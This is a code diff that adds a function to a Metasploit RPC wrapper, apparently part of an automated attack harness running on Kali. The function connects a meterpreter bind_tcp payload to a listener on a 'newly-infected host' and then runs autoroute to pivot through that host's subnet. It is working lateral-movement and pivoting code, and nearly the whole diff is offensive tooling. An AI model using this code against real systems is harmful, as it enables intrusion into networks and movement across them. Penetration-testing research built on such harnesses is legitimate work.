@@ -118,11 +118,63 @@ def run_exploit(client: MsfRpcClient, args: dict) -> dict:
     }
 
 
+def connect_to_session_via_bind(client: MsfRpcClient, args: dict) -> dict:
+    """Connect msfrpcd to the bind listener a lateral-move payload opened on the
+    newly-infected host, then autoroute its subnet through the resulting session.
+    Mirrors MetasploitService.connect_to_session_via_bind() but runs on Kali (the
+    harness side can't reach Kali's 127.0.0.1-only msfrpcd). Self-contained: uses
+    the raw MsfRpcClient only, no incalmo imports."""
+    ip_address = args["ip_address"]
+    lport = int(args.get("lport", 7777))
+
+    def _session_ids() -> set:
+        return set((client.sessions.list or {}).keys())
+
+    previous = _session_ids()
+
+    # multi/handler + a bind_tcp meterpreter payload: msf reaches OUT to the
+    # listener the RunMetasploitBindFile step opened on the target.
+    exploit = client.modules.use("exploit", "multi/handler")
+    payload = client.modules.use("payload", "linux/x64/meterpreter/bind_tcp")
+    payload["LPORT"] = lport
+    payload["RHOST"] = ip_address
+    cid = client.consoles.console().cid
+    console_output = client.consoles.console(cid).run_module_with_output(
+        exploit, payload=payload, timeout=30
+    )
+
+    new = _session_ids() - previous
+    if not new:
+        return {
+            "error": "Failed to connect to session via bind shell: No new session found",
+            "console_output": console_output,
+        }
+    # Deterministic pick if more than one appeared; ids may be int or str.
+    session_id = sorted(new, key=lambda s: str(s))[0]
+
+    # autoroute autoadd: route the target's subnet through the new session.
+    autoroute = client.modules.use("post", "multi/manage/autoroute")
+    autoroute["SESSION"] = session_id
+    autoroute["CMD"] = "autoadd"
+    ar_cid = client.consoles.console().cid
+    autoroute_output = client.consoles.console(ar_cid).run_module_with_output(
+        autoroute, timeout=30
+    )
+
+    return {
+        "ip_address": ip_address,
+        "session_id": session_id,
+        "console_output": console_output,
+        "autoroute_output": autoroute_output,
+    }
+
+
 _OPS = {
     "search_exploits": search_exploits,
     "get_exploit_module_options": get_exploit_module_options,
     "get_payload_options": get_payload_options,
     "run_exploit": run_exploit,
+    "connect_to_session_via_bind": connect_to_session_via_bind,
 }
 
 
